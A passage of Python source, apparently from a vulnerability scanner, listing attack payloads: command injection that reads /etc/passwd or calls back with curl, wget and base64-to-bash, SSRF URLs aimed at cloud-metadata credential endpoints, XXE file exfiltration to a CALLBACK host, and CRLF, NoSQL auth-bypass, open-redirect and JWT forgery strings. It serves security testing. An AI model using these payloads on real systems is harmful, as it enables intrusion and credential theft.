    Payload("; whoami", PayloadCategory.RCE, description="Semicolon whoami"),
    Payload("| whoami", PayloadCategory.RCE, description="Pipe whoami"),
    Payload("|| whoami", PayloadCategory.RCE, description="OR whoami"),
    Payload("`whoami`", PayloadCategory.RCE, description="Backtick whoami"),
    Payload("$(whoami)", PayloadCategory.RCE, description="Subshell whoami"),
    # --- File read ---
    Payload("; cat /etc/passwd", PayloadCategory.RCE, description="Cat passwd"),
    Payload("| cat /etc/passwd", PayloadCategory.RCE, description="Pipe cat passwd"),
    Payload("$(cat /etc/passwd)", PayloadCategory.RCE, description="Subshell cat passwd"),
    Payload("; type C:\\Windows\\win.ini", PayloadCategory.RCE,
            description="Windows type win.ini"),
    # --- Time-based blind ---
    Payload("; sleep 5", PayloadCategory.RCE, blind=True, time_delay=5.0,
            description="Sleep blind"),
    Payload("| sleep 5", PayloadCategory.RCE, blind=True, time_delay=5.0,
            description="Pipe sleep blind"),
    Payload("|| sleep 5", PayloadCategory.RCE, blind=True, time_delay=5.0,
            description="OR sleep blind"),
    Payload("&& sleep 5", PayloadCategory.RCE, blind=True, time_delay=5.0,
            description="AND sleep blind"),
    Payload("`sleep 5`", PayloadCategory.RCE, blind=True, time_delay=5.0,
            description="Backtick sleep blind"),
    Payload("$(sleep 5)", PayloadCategory.RCE, blind=True, time_delay=5.0,
            description="Subshell sleep blind"),
    Payload("& ping -n 5 127.0.0.1 &", PayloadCategory.RCE, blind=True, time_delay=5.0,
            description="Windows ping delay"),
    Payload("& timeout /T 5 &", PayloadCategory.RCE, blind=True, time_delay=5.0,
            description="Windows timeout delay"),
    # --- OOB (callback) ---
    Payload("; curl http://CALLBACK/rce", PayloadCategory.RCE, blind=True,
            description="OOB curl callback"),
    Payload("; wget http://CALLBACK/rce", PayloadCategory.RCE, blind=True,
            description="OOB wget callback"),
    Payload("; nslookup CALLBACK", PayloadCategory.RCE, blind=True,
            description="OOB DNS callback"),
    Payload("| curl http://CALLBACK/rce", PayloadCategory.RCE, blind=True,
            description="OOB pipe curl"),
    Payload("$(curl http://CALLBACK/rce)", PayloadCategory.RCE, blind=True,
            description="OOB subshell curl"),
    Payload("; ping -c 1 CALLBACK", PayloadCategory.RCE, blind=True,
            description="OOB ping callback"),
    # --- Filter bypass (IFS, variable substitution) ---
    Payload("a]&&id||b", PayloadCategory.RCE, waf_level=1,
            description="Bracket confusion"),
    Payload(";{id,}", PayloadCategory.RCE, waf_level=1, description="Brace expansion"),
    Payload("$IFS;id", PayloadCategory.RCE, waf_level=1, description="IFS separator"),
    Payload(";i]d", PayloadCategory.RCE, waf_level=1, description="Bracket in command"),
    Payload(";{cat,/etc/passwd}", PayloadCategory.RCE, waf_level=1,
            description="Brace expansion cat"),
    Payload(";cat${IFS}/etc/passwd", PayloadCategory.RCE, waf_level=1,
            description="IFS cat passwd"),
    Payload(";cat$IFS/etc/passwd", PayloadCategory.RCE, waf_level=1,
            description="IFS unbraced cat"),
    Payload(";cat%09/etc/passwd", PayloadCategory.RCE, waf_level=1,
            description="Tab separator cat"),
    Payload(";cat%20/etc/passwd", PayloadCategory.RCE, waf_level=1,
            description="URL space cat"),
    Payload(";c'a't /etc/passwd", PayloadCategory.RCE, waf_level=2,
            description="Quote split command"),
    Payload(';c"a"t /etc/passwd', PayloadCategory.RCE, waf_level=2,
            description="Dquote split command"),
    Payload(";c\\at /etc/passwd", PayloadCategory.RCE, waf_level=2,
            description="Backslash split command"),
    Payload(";/b]in/cat /etc/passwd", PayloadCategory.RCE, waf_level=2,
            description="Bracket in path"),
    Payload(";$(echo id)", PayloadCategory.RCE, waf_level=1,
            description="Echo subshell bypass"),
    Payload(";$(echo 'aWQ='|base64 -d)", PayloadCategory.RCE, waf_level=2,
            description="Base64 encoded command"),
    Payload(";echo${IFS}Y2F0IC9ldGMvcGFzc3dk|base64${IFS}-d|bash", PayloadCategory.RCE,
            waf_level=3, description="Base64 piped bash"),
    # --- Windows specific ---
    Payload("& whoami", PayloadCategory.RCE, description="Windows amp whoami"),
    Payload("| dir", PayloadCategory.RCE, description="Windows pipe dir"),
    Payload("& type C:\\Windows\\win.ini", PayloadCategory.RCE,
            description="Windows type win.ini"),
    Payload("& net user", PayloadCategory.RCE, description="Windows net user"),
    Payload("| net user", PayloadCategory.RCE, description="Windows pipe net user"),
    # --- Newline injection ---
    Payload("%0aid", PayloadCategory.RCE, waf_level=1, description="Newline cmd injection"),
    Payload("\\nid", PayloadCategory.RCE, waf_level=1, description="Escape newline injection"),
]


_SSRF_PAYLOADS: list[Payload] = [
    # --- Basic localhost ---
    Payload("http://127.0.0.1", PayloadCategory.SSRF, description="Localhost"),
    Payload("http://localhost", PayloadCategory.SSRF, description="Localhost name"),
    Payload("http://[::1]", PayloadCategory.SSRF, description="IPv6 localhost"),
    Payload("http://0.0.0.0", PayloadCategory.SSRF, description="All interfaces"),
    Payload("http://127.0.0.1:80", PayloadCategory.SSRF, description="Localhost port 80"),
    Payload("http://127.0.0.1:443", PayloadCategory.SSRF, description="Localhost port 443"),
    Payload("http://127.0.0.1:8080", PayloadCategory.SSRF, description="Localhost port 8080"),
    Payload("http://127.0.0.1:8443", PayloadCategory.SSRF, description="Localhost port 8443"),
    Payload("http://127.0.0.1:3000", PayloadCategory.SSRF, description="Localhost port 3000"),
    Payload("http://127.0.0.1:9200", PayloadCategory.SSRF,
            description="Localhost Elasticsearch"),
    Payload("http://127.0.0.1:6379", PayloadCategory.SSRF, description="Localhost Redis"),
    Payload("http://127.0.0.1:27017", PayloadCategory.SSRF, description="Localhost MongoDB"),
    Payload("http://127.0.0.1:11211", PayloadCategory.SSRF, description="Localhost Memcached"),
    # --- AWS metadata (IMDSv1 + IMDSv2) ---
    Payload("http://169.254.169.254", PayloadCategory.SSRF, description="AWS metadata base"),
    Payload("http://169.254.169.254/latest/meta-data/", PayloadCategory.SSRF,
            description="AWS metadata root"),
    Payload("http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            PayloadCategory.SSRF, description="AWS IAM credentials"),
    Payload("http://169.254.169.254/latest/user-data", PayloadCategory.SSRF,
            description="AWS user-data"),
    Payload("http://169.254.169.254/latest/meta-data/hostname", PayloadCategory.SSRF,
            description="AWS hostname"),
    Payload("http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance",  # noqa: E501
            PayloadCategory.SSRF, description="AWS EC2 credentials"),
    Payload("http://169.254.170.2/v2/credentials", PayloadCategory.SSRF,
            description="AWS ECS task credentials"),
    # --- GCP metadata ---
    Payload("http://metadata.google.internal", PayloadCategory.SSRF,
            description="GCP metadata base"),
    Payload("http://metadata.google.internal/computeMetadata/v1/", PayloadCategory.SSRF,
            description="GCP compute metadata"),
    Payload("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"
            "default/token", PayloadCategory.SSRF, description="GCP service account token"),
    Payload("http://metadata.google.internal/computeMetadata/v1/project/project-id",
            PayloadCategory.SSRF, description="GCP project ID"),
    # --- Azure metadata ---
    Payload("http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            PayloadCategory.SSRF, description="Azure instance metadata"),
    Payload("http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01"
            "&resource=https://management.azure.com/",
            PayloadCategory.SSRF, description="Azure managed identity token"),
    # --- DigitalOcean metadata ---
    Payload("http://169.254.169.254/metadata/v1/", PayloadCategory.SSRF,
            description="DO metadata root"),
    Payload("http://169.254.169.254/metadata/v1/user-data", PayloadCategory.SSRF,
            description="DO user-data"),
    # --- Alibaba Cloud metadata ---
    Payload("http://100.100.100.200", PayloadCategory.SSRF, description="Alibaba metadata"),
    Payload("http://100.100.100.200/latest/meta-data/", PayloadCategory.SSRF,
            description="Alibaba metadata root"),
    Payload("http://100.100.100.200/latest/meta-data/ram/security-credentials/",
            PayloadCategory.SSRF, description="Alibaba RAM credentials"),
    # --- Oracle Cloud metadata ---
    Payload("http://169.254.169.254/opc/v2/instance/", PayloadCategory.SSRF,
            description="Oracle Cloud instance"),
    Payload("http://169.254.169.254/opc/v1/identity/", PayloadCategory.SSRF,
            description="Oracle Cloud identity"),
    # --- IP bypass variants ---
    Payload("http://0177.0.0.1", PayloadCategory.SSRF, waf_level=1,
            description="Octal localhost"),
    Payload("http://0x7f000001", PayloadCategory.SSRF, waf_level=1,
            description="Hex localhost"),
    Payload("http://2130706433", PayloadCategory.SSRF, waf_level=1,
            description="Decimal localhost"),
    Payload("http://127.1", PayloadCategory.SSRF, waf_level=1, description="Short localhost"),
    Payload("http://0", PayloadCategory.SSRF, waf_level=1, description="Zero localhost"),
    Payload("http://0x7f.0x0.0x0.0x1", PayloadCategory.SSRF, waf_level=1,
            description="Hex dotted localhost"),
    Payload("http://[0:0:0:0:0:ffff:127.0.0.1]", PayloadCategory.SSRF, waf_level=1,
            description="IPv6 mapped localhost"),
    Payload("http://[::ffff:127.0.0.1]", PayloadCategory.SSRF, waf_level=1,
            description="IPv6 short mapped localhost"),
    Payload("http://127.0.0.1.nip.io", PayloadCategory.SSRF, waf_level=2,
            description="DNS rebinding via nip.io"),
    Payload("http://spoofed.burpcollaborator.net", PayloadCategory.SSRF, waf_level=2,
            description="DNS rebinding placeholder"),
    Payload("http://localtest.me", PayloadCategory.SSRF, waf_level=1,
            description="DNS resolves to 127.0.0.1"),
    Payload("http://customer1.app.localhost.my.company.127.0.0.1.nip.io", PayloadCategory.SSRF,
            waf_level=2, description="Complex DNS rebinding"),
    Payload("http://127.127.127.127", PayloadCategory.SSRF, waf_level=1,
            description="Alt localhost range"),
    Payload("http://0177.0.0.01", PayloadCategory.SSRF, waf_level=1,
            description="Mixed octal localhost"),
    Payload("http://0x7f.1", PayloadCategory.SSRF, waf_level=1,
            description="Hex + short localhost"),
    # --- URL parser confusion ---
    Payload("http://evil.com@127.0.0.1", PayloadCategory.SSRF, waf_level=1,
            description="URL auth confusion"),
    Payload("http://127.0.0.1#@evil.com", PayloadCategory.SSRF, waf_level=1,
            description="Fragment confusion"),
    Payload("http://127.0.0.1%23@evil.com", PayloadCategory.SSRF, waf_level=1,
            description="Encoded fragment confusion"),
    Payload("http://evil.com\\@127.0.0.1", PayloadCategory.SSRF, waf_level=1,
            description="Backslash auth confusion"),
    Payload("http://localhost:80\\@evil.com", PayloadCategory.SSRF, waf_level=2,
            description="Port + backslash confusion"),
    # --- Protocol smuggling ---
    Payload("gopher://127.0.0.1:25/_EHLO", PayloadCategory.SSRF, waf_level=2,
            description="Gopher SMTP"),
    Payload("gopher://127.0.0.1:6379/_INFO", PayloadCategory.SSRF, waf_level=2,
            description="Gopher Redis INFO"),
    Payload("gopher://127.0.0.1:6379/_CONFIG%20GET%20*", PayloadCategory.SSRF, waf_level=2,
            description="Gopher Redis CONFIG"),
    Payload("gopher://127.0.0.1:3306/_", PayloadCategory.SSRF, waf_level=2,
            description="Gopher MySQL"),
    Payload("dict://127.0.0.1:6379/info", PayloadCategory.SSRF, waf_level=2,
            description="Dict Redis info"),
    Payload("dict://127.0.0.1:11211/stats", PayloadCategory.SSRF, waf_level=2,
            description="Dict Memcached stats"),
    Payload("file:///etc/passwd", PayloadCategory.SSRF, description="File protocol"),
    Payload("file:///etc/hosts", PayloadCategory.SSRF, description="File hosts"),
    Payload("ftp://127.0.0.1/", PayloadCategory.SSRF, waf_level=1, description="FTP protocol"),
    Payload("tftp://127.0.0.1/test", PayloadCategory.SSRF, waf_level=2,
            description="TFTP protocol"),
    Payload("ldap://127.0.0.1/", PayloadCategory.SSRF, waf_level=2, description="LDAP"),
    # --- Internal network scan ---
    Payload("http://10.0.0.1", PayloadCategory.SSRF, description="Internal 10.x"),
    Payload("http://172.16.0.1", PayloadCategory.SSRF, description="Internal 172.16.x"),
    Payload("http://192.168.0.1", PayloadCategory.SSRF, description="Internal 192.168.x"),
    Payload("http://192.168.1.1", PayloadCategory.SSRF, description="Internal gateway"),
]


_XXE_PAYLOADS: list[Payload] = [
    # --- Classic XXE ---
    Payload(
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">'
        ']><foo>&xxe;</foo>',
        PayloadCategory.XXE, context=InjectionContext.XML_VALUE,
        description="Classic XXE file read",
    ),
    Payload(
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">'
        ']><foo>&xxe;</foo>',
        PayloadCategory.XXE, context=InjectionContext.XML_VALUE,
        description="XXE hostname read",
    ),
    Payload(
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
        '"file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
        PayloadCategory.XXE, context=InjectionContext.XML_VALUE,
        description="XXE Windows file read",
    ),
    # --- XXE SSRF ---
    Payload(
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
        '"http://127.0.0.1:80/">]><foo>&xxe;</foo>',
        PayloadCategory.XXE, context=InjectionContext.XML_VALUE,
        description="XXE SSRF localhost",
    ),
    Payload(
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
        '"http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
        PayloadCategory.XXE, context=InjectionContext.XML_VALUE,
        description="XXE SSRF AWS metadata",
    ),
    Payload(
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
        '"http://metadata.google.internal/computeMetadata/v1/">]><foo>&xxe;</foo>',
        PayloadCategory.XXE, context=InjectionContext.XML_VALUE,
        description="XXE SSRF GCP metadata",
    ),
    # --- XXE PHP wrappers ---
    Payload(
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
        '"php://filter/convert.base64-encode/resource=/etc/passwd">'
        ']><foo>&xxe;</foo>',
        PayloadCategory.XXE, context=InjectionContext.XML_VALUE,
        description="XXE PHP filter base64",
    ),
    Payload(
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
        '"php://filter/convert.base64-encode/resource=index.php">'
        ']><foo>&xxe;</foo>',
        PayloadCategory.XXE, context=InjectionContext.XML_VALUE,
        description="XXE PHP filter source code",
    ),
    # --- XXE RCE ---
    Payload(
        '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM '
        '"expect://id">]><foo>&xxe;</foo>',
        PayloadCategory.XXE, context=InjectionContext.XML_VALUE,
        description="XXE expect RCE",
    ),
    # --- Blind XXE (OOB via parameter entities) ---
    Payload(
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM '
        '"http://CALLBACK/evil.dtd">%xxe;]><foo>test</foo>',
        PayloadCategory.XXE, context=InjectionContext.XML_VALUE,
        blind=True, description="Blind XXE OOB DTD",
    ),
    Payload(
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM '
        '"http://CALLBACK/xxe">%xxe;%ext;%exfil;]><foo>test</foo>',
        PayloadCategory.XXE, context=InjectionContext.XML_VALUE,
        blind=True, description="Blind XXE exfiltration chain",
    ),
    Payload(
        '<!DOCTYPE foo [<!ENTITY % a SYSTEM "file:///etc/passwd">'
        '<!ENTITY % b "<!ENTITY &#37; c SYSTEM \'http://CALLBACK/?data=%a;\'>">'
        '%b;%c;]>',
        PayloadCategory.XXE, context=InjectionContext.XML_VALUE,
        blind=True, description="Blind XXE nested entity exfil",
    ),
    # --- Error-based XXE ---
    Payload(
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">'
        '<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM \'file:///nonexistent/%xxe;\'>">'
        '%eval;%error;]><foo>test</foo>',
        PayloadCategory.XXE, context=InjectionContext.XML_VALUE,
        description="Error-based XXE data exfil",
    ),
    Payload(
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/hostname">'
        '<!ENTITY % eval "<!ENTITY &#x25; err SYSTEM \'file:///x/%xxe;\'>">'
        '%eval;%err;]>',
        PayloadCategory.XXE, context=InjectionContext.XML_VALUE,
        description="Error-based XXE hostname",
    ),
    # --- SOAP XXE ---
    Payload(
        '<?xml version="1.0"?>'
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">'
        '<soap:Body><foo>&xxe;</foo></soap:Body></soap:Envelope>',
        PayloadCategory.XXE, context=InjectionContext.XML_VALUE,
        description="SOAP XXE injection",
    ),
    # --- SVG XXE ---
    Payload(
        '<?xml version="1.0"?>'
        '<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        '<svg xmlns="http://www.w3.org/2000/svg">'
        '<text x="0" y="20">&xxe;</text></svg>',
        PayloadCategory.XXE, context=InjectionContext.XML_VALUE,
        description="SVG XXE file read",
    ),
    Payload(
        '<?xml version="1.0"?>'
        '<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>'
        '<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">'
        '<text>&xxe;</text></svg>',
        PayloadCategory.XXE, context=InjectionContext.XML_VALUE,
        description="SVG XXE hostname",
    ),
    # --- Content-type switching ---
    Payload(
        '<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">'
        ']><root><data>&xxe;</data></root>',
        PayloadCategory.XXE, context=InjectionContext.XML_VALUE,
        description="XXE via Content-Type: text/xml",
        tags=("content_type_switch",),
    ),
    # --- XInclude ---
    Payload(
        '<foo xmlns:xi="http://www.w3.org/2001/XInclude">'
        '<xi:include parse="text" href="file:///etc/passwd"/></foo>',
        PayloadCategory.XXE, context=InjectionContext.XML_VALUE,
        description="XInclude file read",
    ),
    # --- Billion laughs DoS detection ---
    Payload(
        '<?xml version="1.0"?><!DOCTYPE lolz ['
        '<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">'
        '<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">'
        ']><foo>&lol3;</foo>',
        PayloadCategory.XXE, context=InjectionContext.XML_VALUE,
        description="Mini billion laughs (safe probe)",
    ),
    # --- UTF-7/16 encoding bypass ---
    Payload(
        '<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
        '"file:///etc/passwd">]><foo>&xxe;</foo>',
        PayloadCategory.XXE, context=InjectionContext.XML_VALUE, waf_level=1,
        description="XXE UTF-16 encoding bypass",
    ),
    # --- DTD injection in DOCTYPE ---
    Payload(
        '<!DOCTYPE foo SYSTEM "http://CALLBACK/evil.dtd"><foo>test</foo>',
        PayloadCategory.XXE, context=InjectionContext.XML_VALUE,
        blind=True, description="XXE external DTD",
    ),
    # --- ENTITY in attribute ---
    Payload(
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">'
        ']><foo attr="&xxe;">test</foo>',
        PayloadCategory.XXE, context=InjectionContext.XML_VALUE,
        description="XXE in attribute",
    ),
]


_CRLF_PAYLOADS: list[Payload] = [
    # --- Standard CRLF ---
    Payload("%0d%0aSet-Cookie:crlf=injection", PayloadCategory.CRLF,
            description="CRLF cookie injection"),
    Payload("%0d%0aX-Injected:basilisk", PayloadCategory.CRLF,
            description="CRLF header injection"),
    Payload("%0aX-Injected:basilisk", PayloadCategory.CRLF,
            description="LF-only header injection"),
    Payload("%0dX-Injected:basilisk", PayloadCategory.CRLF,
            description="CR-only header injection"),
    Payload("\\r\\nX-Injected:basilisk", PayloadCategory.CRLF,
            description="Literal CRLF"),
    # --- CRLF to XSS ---
    Payload("%0d%0a%0d%0a<script>alert(1)</script>", PayloadCategory.CRLF,
            description="CRLF to XSS (double CRLF)"),
    Payload("%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>",
            PayloadCategory.CRLF, description="CRLF content-type + XSS"),
    # --- CRLF to session fixation ---
    Payload("%0d%0aSet-Cookie:session=attacker", PayloadCategory.CRLF,
            description="CRLF session fixation"),
    Payload("%0d%0aSet-Cookie:session=attacker;Path=/;HttpOnly", PayloadCategory.CRLF,
            description="CRLF session fixation with flags"),
    # --- CRLF to cache poisoning ---
    Payload("%0d%0aX-Forwarded-Host:evil.com", PayloadCategory.CRLF,
            description="CRLF cache poison via X-Forwarded-Host"),
    # --- Encoding bypass variants ---
    Payload("%E5%98%8A%E5%98%8DSet-Cookie:crlf=injection", PayloadCategory.CRLF,
            waf_level=2, description="UTF-8 encoded CRLF (U+560A U+560D)"),
    Payload("%c4%8d%c4%8aX-Injected:basilisk", PayloadCategory.CRLF,
            waf_level=2, description="UTF-8 overlong CRLF variant"),
    Payload("%0d%0a%20Set-Cookie:crlf=injection", PayloadCategory.CRLF,
            waf_level=1, description="CRLF with leading space"),
    Payload("%u000d%u000aX-Injected:basilisk", PayloadCategory.CRLF,
            waf_level=2, description="Unicode escape CRLF"),
    Payload("%25%30%64%25%30%61X-Injected:basilisk", PayloadCategory.CRLF,
            waf_level=2, description="Double-encoded CRLF"),
    Payload("%%0d%%0aX-Injected:basilisk", PayloadCategory.CRLF,
            waf_level=1, description="Double percent CRLF"),
    # --- Location header injection ---
    Payload("%0d%0aLocation:https://evil.com", PayloadCategory.CRLF,
            description="CRLF open redirect via Location"),
    # --- Multiline header ---
    Payload("%0d%0a%09X-Injected:basilisk", PayloadCategory.CRLF,
            description="CRLF with tab continuation"),
    Payload("%0d%0a Content-Length:0%0d%0a%0d%0a", PayloadCategory.CRLF,
            description="CRLF response splitting"),
]


_NOSQLI_PAYLOADS: list[Payload] = [
    # --- MongoDB operator injection ---
    Payload('{"$gt":""}', PayloadCategory.NOSQLI, context=InjectionContext.JSON_VALUE,
            description="MongoDB $gt bypass"),
    Payload('{"$ne":""}', PayloadCategory.NOSQLI, context=InjectionContext.JSON_VALUE,
            description="MongoDB $ne bypass"),
    Payload('{"$ne":null}', PayloadCategory.NOSQLI, context=InjectionContext.JSON_VALUE,
            description="MongoDB $ne null"),
    Payload('{"$gt":undefined}', PayloadCategory.NOSQLI, context=InjectionContext.JSON_VALUE,
            description="MongoDB $gt undefined"),
    Payload('{"$gte":""}', PayloadCategory.NOSQLI, context=InjectionContext.JSON_VALUE,
            description="MongoDB $gte empty"),
    Payload('{"$regex":".*"}', PayloadCategory.NOSQLI, context=InjectionContext.JSON_VALUE,
            description="MongoDB regex all"),
    Payload('{"$regex":"^a"}', PayloadCategory.NOSQLI, context=InjectionContext.JSON_VALUE,
            description="MongoDB regex prefix"),
    Payload('{"$in":["admin","root","test"]}', PayloadCategory.NOSQLI,
            context=InjectionContext.JSON_VALUE, description="MongoDB $in array"),
    Payload('{"$nin":[""]}', PayloadCategory.NOSQLI, context=InjectionContext.JSON_VALUE,
            description="MongoDB $nin empty"),
    Payload('{"$exists":true}', PayloadCategory.NOSQLI, context=InjectionContext.JSON_VALUE,
            description="MongoDB $exists true"),
    Payload('{"$or":[{},{"a":"a"}]}', PayloadCategory.NOSQLI,
            context=InjectionContext.JSON_VALUE, description="MongoDB $or bypass"),
    Payload('{"$and":[{"$ne":""},{"$ne":"invalid"}]}', PayloadCategory.NOSQLI,
            context=InjectionContext.JSON_VALUE, description="MongoDB $and bypass"),
    # --- Query string form (Express/Mongoose) ---
    Payload("[$gt]=", PayloadCategory.NOSQLI, description="MongoDB query $gt"),
    Payload("[$ne]=", PayloadCategory.NOSQLI, description="MongoDB query $ne"),
    Payload("[$regex]=.*", PayloadCategory.NOSQLI, description="MongoDB query regex"),
    Payload("[$in][]=admin&[$in][]=root", PayloadCategory.NOSQLI,
            description="MongoDB query $in array"),
    Payload("[$exists]=true", PayloadCategory.NOSQLI, description="MongoDB query $exists"),
    Payload("[$or][0]=&[$or][1]=", PayloadCategory.NOSQLI, description="MongoDB query $or"),
    # --- JavaScript injection ($where) ---
    Payload('{"$where":"sleep(5000)"}', PayloadCategory.NOSQLI,
            context=InjectionContext.JSON_VALUE,
            blind=True, time_delay=5.0, description="MongoDB $where sleep"),
    Payload("true, $where: '1 == 1'", PayloadCategory.NOSQLI,
            description="MongoDB inline $where"),
    Payload('{"$where":"this.password.match(/.*/)"}', PayloadCategory.NOSQLI,
            context=InjectionContext.JSON_VALUE, description="MongoDB $where regex match"),
    Payload('{"$where":"return true"}', PayloadCategory.NOSQLI,
            context=InjectionContext.JSON_VALUE, description="MongoDB $where return true"),
    Payload("1;return true", PayloadCategory.NOSQLI, description="MongoDB JS injection true"),
    Payload("1;return false", PayloadCategory.NOSQLI, description="MongoDB JS injection false"),
    # --- Aggregation pipeline injection ---
    Payload('[{"$match":{"$gt":""}}]', PayloadCategory.NOSQLI,
            context=InjectionContext.JSON_VALUE, description="MongoDB aggregation $match"),
    Payload('[{"$lookup":{"from":"users","localField":"_id","foreignField":"_id","as":"all"}}]',
            PayloadCategory.NOSQLI, context=InjectionContext.JSON_VALUE,
            description="MongoDB aggregation $lookup"),
    # --- Authentication bypass patterns ---
    Payload('{"username":{"$ne":""},"password":{"$ne":""}}', PayloadCategory.NOSQLI,
            context=InjectionContext.JSON_VALUE, description="MongoDB auth bypass $ne"),
    Payload('{"username":{"$gt":""},"password":{"$gt":""}}', PayloadCategory.NOSQLI,
            context=InjectionContext.JSON_VALUE, description="MongoDB auth bypass $gt"),
    Payload('{"username":"admin","password":{"$ne":""}}', PayloadCategory.NOSQLI,
            context=InjectionContext.JSON_VALUE, description="MongoDB admin bypass"),
    Payload('{"username":{"$regex":"admin"},"password":{"$ne":""}}', PayloadCategory.NOSQLI,
            context=InjectionContext.JSON_VALUE, description="MongoDB admin regex bypass"),
    # --- NoSQL blind (timing) ---
    Payload('{"$where":"function(){var d=new Date();var c=new Date();while(c-d<5000)'
            '{c=new Date();}return true;}"}',
            PayloadCategory.NOSQLI, context=InjectionContext.JSON_VALUE,
            blind=True, time_delay=5.0, description="MongoDB $where JS delay"),
    # --- CouchDB specific ---
    Payload('{"selector":{"_id":{"$gt":null}}}', PayloadCategory.NOSQLI,
            context=InjectionContext.JSON_VALUE, description="CouchDB selector bypass"),
]


_REDIRECT_PAYLOADS: list[Payload] = [
    Payload("//evil.com", PayloadCategory.OPEN_REDIRECT, description="Protocol-relative"),
    Payload("https://evil.com", PayloadCategory.OPEN_REDIRECT, description="Absolute URL"),
    Payload("/\\evil.com", PayloadCategory.OPEN_REDIRECT, description="Backslash bypass"),
    Payload("/%09/evil.com", PayloadCategory.OPEN_REDIRECT, description="Tab bypass"),
    Payload("//evil.com/%2f..", PayloadCategory.OPEN_REDIRECT, description="Path confusion"),
    Payload("https:evil.com", PayloadCategory.OPEN_REDIRECT, description="Missing slashes"),
    Payload("////evil.com", PayloadCategory.OPEN_REDIRECT, description="Multi slash"),
    Payload("https://evil.com@target.com", PayloadCategory.OPEN_REDIRECT,
            description="Auth confusion"),
    Payload("/\\/evil.com", PayloadCategory.OPEN_REDIRECT, description="Double backslash"),
    Payload("/%2f%2fevil.com", PayloadCategory.OPEN_REDIRECT, description="Encoded slashes"),
    Payload("///evil.com", PayloadCategory.OPEN_REDIRECT, description="Triple slash"),
    Payload("http:evil.com", PayloadCategory.OPEN_REDIRECT, description="HTTP missing slash"),
    Payload("//evil%E3%80%82com", PayloadCategory.OPEN_REDIRECT,
            description="Unicode dot bypass"),
    Payload("/.evil.com", PayloadCategory.OPEN_REDIRECT, description="Dot prefix"),
    Payload("//evil.com\\@target.com", PayloadCategory.OPEN_REDIRECT,
            description="Backslash auth"),
    Payload("https://evil.com%23@target.com", PayloadCategory.OPEN_REDIRECT,
            description="Fragment auth confusion"),
]


_JWT_PAYLOADS: list[Payload] = [
    # --- Algorithm none bypass ---
    Payload(
        '{"alg":"none"}', PayloadCategory.JWT,
        description="JWT alg:none bypass",
    ),
    Payload(
        '{"alg":"None"}', PayloadCategory.JWT,
        description="JWT alg:None (case variant)",
    ),
    Payload(
        '{"alg":"NONE"}', PayloadCategory.JWT,
        description="JWT alg:NONE (uppercase)",
    ),
    Payload(
        '{"alg":"nOnE"}', PayloadCategory.JWT,
        description="JWT alg:nOnE (mixed case)",
    ),
    Payload(
        '{"alg":"none","typ":"JWT"}', PayloadCategory.JWT,
        description="JWT alg:none with typ",
    ),
    # --- Algorithm confusion RS256→HS256 ---
    Payload(
        '{"alg":"HS256"}', PayloadCategory.JWT,
        description="JWT RS256→HS256 key confusion",
        tags=("algorithm_confusion",),
    ),
    Payload(
        '{"alg":"HS384"}', PayloadCategory.JWT,
        description="JWT RS384→HS384 key confusion",
        tags=("algorithm_confusion",),
    ),
    Payload(
        '{"alg":"HS512"}', PayloadCategory.JWT,
        description="JWT RS512→HS512 key confusion",
        tags=("algorithm_confusion",),
    ),
    # --- KID injection ---
    Payload(
        '{"alg":"HS256","kid":"../../dev/null"}', PayloadCategory.JWT,
        description="JWT kid path traversal (empty key)",
        tags=("kid_injection",),
    ),
    Payload(
        '{"alg":"HS256","kid":"/dev/null"}', PayloadCategory.JWT,
        description="JWT kid absolute path (null key)",
        tags=("kid_injection",),
    ),
    Payload(
        """{"alg":"HS256","kid":"' UNION SELECT 'key' -- "}""",
        PayloadCategory.JWT,
        description="JWT kid SQLi (extract key)",
        tags=("kid_injection", "sqli"),
    ),
    Payload(
        '{"alg":"HS256","kid":"| sleep 5"}', PayloadCategory.JWT,
        blind=True, time_delay=5.0,
        description="JWT kid command injection",
        tags=("kid_injection", "rce"),
    ),
    Payload(
        '{"alg":"HS256","kid":"key.pem"}', PayloadCategory.JWT,
        description="JWT kid file read attempt",
        tags=("kid_injection",),
    ),
